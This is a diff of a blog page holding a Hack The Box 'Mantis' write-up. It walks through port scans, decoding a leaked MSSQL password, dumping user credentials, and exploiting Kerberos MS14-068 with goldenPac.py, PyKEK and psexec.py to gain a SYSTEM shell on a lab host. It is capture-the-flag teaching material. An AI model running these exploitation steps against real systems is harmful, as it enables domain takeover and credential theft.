@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Mantis write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -336,7 +336,7 @@ if (language) {
 <h3 id="tcp-ports">TCP ports</h3>
 
 <p>We scan the full range of TCP ports using nmap:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -T4 -A -p- 10.10.10.52
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -T4 -A -p- 10.10.10.52
 
 PORT      STATE    SERVICE      VERSION
 53/tcp    open     domain       Microsoft DNS 6.1.7601
@@ -441,12 +441,12 @@ Host script results:
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: required
-|_smbv2-enabled: Server supports SMBv2 protocol</code></pre></div></div></p>
+|_smbv2-enabled: Server supports SMBv2 protocol</code></pre></div></p>
 
 <h3 id="udp-ports">UDP ports</h3>
 
 <p>We scan only the 1000 most common UDP ports using nmap (because UDP scanning is too slow):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -T4 -sU -A --top-ports=1000 10.10.10.52
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -T4 -sU -A --top-ports=1000 10.10.10.52
 
 PORT      STATE         SERVICE        VERSION
 9/udp     open|filtered discard
@@ -511,13 +511,13 @@ Too many fingerprints match this host to give specific OS details
 Service Info: Host: MANTIS; OS: Windows; Device: broadband router; CPE: cpe:/o:microsoft:windows_server, cpe:/o:microsoft:windows, cpe:/h:zoom:x5
 
 Host script results:
-|_clock-skew: mean: 8s, deviation: 0s, median: 8s</code></pre></div></div></p>
+|_clock-skew: mean: 8s, deviation: 0s, median: 8s</code></pre></div></p>
 
 <h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
 <h3 id="port-1337">Port 1337</h3>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.52:1337 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.52:1337 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
 
 Extensions: asp | Threads: 10 | Wordlist size: 220521
 
@@ -526,11 +526,11 @@ Target: http://10.10.10.52:1337
 [09:17:59] Starting: 
 [09:18:00] 200 -  689B  - /
 [09:30:17] 500 -    3KB - /orchard
-[10:06:05] 301 -  160B  - /secure_notes  -&gt;  http://10.10.10.52:1337/secure_notes/</code></pre></div></div>
+[10:06:05] 301 -  160B  - /secure_notes  -&gt;  http://10.10.10.52:1337/secure_notes/</code></pre></div>
 
 <h3 id="port-8080">Port 8080</h3>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.52:8080 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.52:8080 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
 
 Target: http://10.10.10.52:8080
 
@@ -545,7 +545,7 @@ Target: http://10.10.10.52:8080
 [10:40:06] 200 -    3KB - /Blogs
 [10:45:24] 200 -    3KB - /newsarchive
 [10:54:36] 200 -    3KB - /news_archive
-[11:18:17] 302 -  163B  - /Admin  -&gt;  /Users/Account/AccessDenied?ReturnUrl=%2FAdmin</code></pre></div></div>
+[11:18:17] 302 -  163B  - /Admin  -&gt;  /Users/Account/AccessDenied?ReturnUrl=%2FAdmin</code></pre></div>
 
 <p>Let&rsquo;s visit <a href="http://10.10.10.52:1337/secure_notes/" target="_blank">http://10.10.10.52:1337/secure_notes/</a>
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">10.10.10.52 - /secure_notes/
@@ -563,12 +563,12 @@ Target: http://10.10.10.52:8080
 6. Add blog pages with admin user.</code></pre></div></p>
 
 <p>The filename dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt seems to contain some base64-encoded text. Let&rsquo;s explore it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
-6d2424716c5f53405f504073735730726421</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
+6d2424716c5f53405f504073735730726421</code></pre></div></p>
 
 <p>This seems like a hex string. Let&rsquo;s convert it to ASCII:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ echo 6d2424716c5f53405f504073735730726421 | xxd -r -p
-m$$ql_S@_P@ssW0rd!</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo 6d2424716c5f53405f504073735730726421 | xxd -r -p
+m$$ql_S@_P@ssW0rd!</code></pre></div></p>
 
 <p>Bingo! We found an MSSQL password. Let&rsquo;s test it using the username &ldquo;admin&rdquo;.</p>
 
@@ -576,7 +576,7 @@ m$$ql_S@_P@ssW0rd!</code></pre></div></div></p>
 
 <h2 id="using-impacket-mssqlclient-py">Using Impacket (mssqlclient.py)</h2>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">mssqlclient.py -p 1433 admin:m\$\$ql_S@_P@ssW0rd\!@10.10.10.52
+<div class="bg-black"><pre><code class="language-console" data-lang="console">mssqlclient.py -p 1433 admin:m\$\$ql_S@_P@ssW0rd\!@10.10.10.52
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
 [*] Encryption required, switching to TLS
@@ -620,11 +620,11 @@ SQL&gt; select UserName,Password from blog_Orchard_Users_UserPartRecord
 admin
 AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
 James
-J@m3s_P@ssW0rd!</code></pre></div></div>
+J@m3s_P@ssW0rd!</code></pre></div>
 
 <h2 id="using-metasploit">Using Metasploit</h2>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfconsole
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msfconsole
 msf &gt; use auxiliary/admin/mssql/mssql_findandsampledata
 msf auxiliary(mssql_findandsampledata) &gt; set USERNAME admin
 msf auxiliary(mssql_findandsampledata) &gt; set PASSWORD m$$ql_S@_P@ssW0rd!
@@ -652,7 +652,7 @@ msf auxiliary(mssql_findandsampledata) &gt; exploit
 [*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., PasswordSalt, nvarchar, NA
 [*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., PasswordSalt, nvarchar, UBwWF1CQCsaGc/P7jIR/kg==
 [*] 10.10.10.52:1433 - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed</code></pre></div></div>
+[*] Auxiliary module execution completed</code></pre></div>
 
 <h1 id="exploiting-kerberos">Exploiting Kerberos</h1>
 
@@ -662,11 +662,11 @@ Let&rsquo;s use them to exploit Kerberos:</p>
 <h2 id="using-impacket-goldenpac-py">Using Impacket (goldenPac.py)</h2>
 
 <p>Add these lines to /etc/hosts:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">10.10.10.52 mantis.htb.local
-10.10.10.52 htb.local</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">10.10.10.52 mantis.htb.local
+10.10.10.52 htb.local</code></pre></div></p>
 
 <p>Now let&rsquo;s run goldenPac.py:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
 
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
@@ -685,41 +685,41 @@ Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32&gt; whoami
-nt authority\system</code></pre></div></div></p>
+nt authority\system</code></pre></div></p>
 
 <h2 id="using-pykek-i-e-python-kerberos-exploitation-kit-ms14-068-py">Using PyKEK i.e. Python Kerberos Exploitation Kit (ms14-068.py)</h2>
 
 <p>Add these lines to /etc/hosts:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">10.10.10.52 mantis.htb.local
-10.10.10.52 htb.local</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">10.10.10.52 mantis.htb.local
+10.10.10.52 htb.local</code></pre></div></p>
 
 <p>Add this line to /etc/resolv.conf:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">nameserver 10.10.10.52</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">nameserver 10.10.10.52</code></pre></div></p>
 
 <p>Get USER_SID using rpcclient:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ rpcclient -U james 10.10.10.52
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ rpcclient -U james 10.10.10.52
 Enter james&#39;s password: J@m3s_P@ssW0rd!
 rpcclient $&gt; lookupnames james
-james S-1-5-21-4220043660-4019079961-2895681657-1103</code></pre></div></div></p>
+james S-1-5-21-4220043660-4019079961-2895681657-1103</code></pre></div></p>
 
 <p>Create the ticket and copy it into the proper location:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ git clone https://github.com/bidord/pykek &amp;&amp; cd pykek
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ git clone https://github.com/bidord/pykek &amp;&amp; cd pykek
 $ python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
 Password:J@m3s_P@ssW0rd!
 
-$ cp TGT_james@htb.local.ccache /tmp/krb5cc_$(echo $UID)</code></pre></div></div></p>
+$ cp TGT_james@htb.local.ccache /tmp/krb5cc_$(echo $UID)</code></pre></div></p>
 
 <p>Connect using smbclient:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbclient -k -U james \\\\mantis.htb.local\\C$
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ smbclient -k -U james \\\\mantis.htb.local\\C$
 
 OS=[Windows Server 2008 R2 Standard 7601 Service Pack 1] Server=[Windows Server 2008 R2 Standard 6.1]
 smb: \&gt; more \USERS\Administrator\DESKTOP\root.txt
-209dc756ee5c09a9967540fe18d15567</code></pre></div></div></p>
+209dc756ee5c09a9967540fe18d15567</code></pre></div></p>
 
 <h2 id="a-word-of-advice">A word of advice</h2>
 
 <p>If Kerberos does not work as expected, make sure that you have added the proper lines in /etc/hosts and /etc/resolv.conf (and -of course- check the kerberos configuration files if you use them). Notice that kinit seems to need UPPERCASE letters for the domain in order to work correctly. Compare the following different results:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ kinit -V james@htb.local
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ kinit -V james@htb.local
 Using default cache: /tmp/krb5cc_1000
 Using principal: james@htb.local
 Password for james@htb.local: J@m3s_P@ssW0rd!
@@ -730,11 +730,11 @@ Using default cache: /tmp/krb5cc_1000
 Using principal: james@HTB.LOCAL
 Password for james@HTB.LOCAL: J@m3s_P@ssW0rd!
 Authenticated to Kerberos v5
-BONUS: Exploitation using left behind services</code></pre></div></div></p>
+BONUS: Exploitation using left behind services</code></pre></div></p>
 
 <h1 id="look-mom-no-need-for-kerberos-exploit-d">Look Mom! No need for kerberos exploit! :D</h1>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ psexec.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ psexec.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
 [*] Trying protocol 445/SMB...
@@ -752,10 +752,10 @@ Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32&gt;whoami
-nt authority\system</code></pre></div></div>
+nt authority\system</code></pre></div>
 
 <p>We got some errors, but it worked! Maybe we have access to a writable share after all&hellip;
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbmap.py -u james -p J@m3s_P@ssW0rd\! -H mantis.htb.local
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ smbmap.py -u james -p J@m3s_P@ssW0rd\! -H mantis.htb.local
 [+] Finding open SMB ports....
 [+] User SMB session establishd on mantis.htb.local...
 [+] IP: mantis.htb.local:445    Name: mantis.htb.local                                  
@@ -765,17 +765,17 @@ nt authority\system</code></pre></div></div>
     C$                                                  NO ACCESS
     IPC$                                                NO ACCESS
     NETLOGON                                            READ ONLY
-    SYSVOL                                              READ ONLY</code></pre></div></div></p>
+    SYSVOL                                              READ ONLY</code></pre></div></p>
 
 <p>No. We don&rsquo;t have access to a writable share. This is very strange. How did we get nt authority\system shell? I decided to open an issue on the github: <a href="https://github.com/CoreSecurity/impacket/issues/346" target="_blank">https://github.com/CoreSecurity/impacket/issues/346</a></p>
 
 <p>It seems that psexec.py is connecting to a previous RemComSvc instance that is still running in the target system. The need for a writeable share is only for copying the RemComSvc Windows Service file. Once it is running, all communication is done through Windows Named Pipes.</p>
 
 <p>I changed the password for the administrator account to make it easier to explore the issue:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">C:\Windows\system32&gt; net user Administrator P@ssw0rd</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">C:\Windows\system32&gt; net user Administrator P@ssw0rd</code></pre></div></p>
 
 <p>We can use Impacket (services.py) to list the services. We look for services named using four random uppercase letters. Moreover, their executable file should be named using eight random mixed case letters and its path should be inside C:\Windows\ :
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">services.py htb.local/administrator:P@ssw0rd@mantis.htb.local list
+<div class="bg-black"><pre><code class="language-console" data-lang="console">services.py htb.local/administrator:P@ssw0rd@mantis.htb.local list
 
 ...
 IHXM -                   IHXM -  RUNNING
@@ -810,10 +810,10 @@ LOAD_ORDER_GROUP  :
 TAG               : 0
 DISPLAY_NAME      : TZZW
 DEPENDENCIES      : /
-SERVICE_START_NAME: LocalSystem</code></pre></div></div></p>
+SERVICE_START_NAME: LocalSystem</code></pre></div></p>
 
 <p>Now, let&rsquo;s try to stop those two services and check if psexec still works as before:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local stop -name IHXM
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local stop -name IHXM
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
 [*] Trying protocol 445/SMB...
@@ -837,7 +837,7 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 [-] share &#39;SYSVOL&#39; is not writable.
 [*] Uploading file ysSjUyKc.exe
 [-] Error uploading file ysSjUyKc.exe, aborting.....
-[-] Error performing the installation, cleaning up: &#39;NoneType&#39; object has no attribute &#39;split&#39;</code></pre></div></div></p>
+[-] Error performing the installation, cleaning up: &#39;NoneType&#39; object has no attribute &#39;split&#39;</code></pre></div></p>
 
 <p>Yup, it doesn&rsquo;t work anymore. This confirms that those two services were responsible for the previous behaviour. But how those services were installed on the box in the first place? I don&rsquo;t know. Probably, during the testing phase, some pentester tried to use psexec.py. If -for any reason- the cleaning up phase of the tool failed, it left behind those services.</p>
 
@@ -889,25 +889,21 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -957,6 +953,150 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -996,6 +1136,114 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1028,122 +1276,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1217,21 +1349,121 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1293,6 +1525,30 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
     <div class="cell">
@@ -1317,170 +1573,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
           
            
            
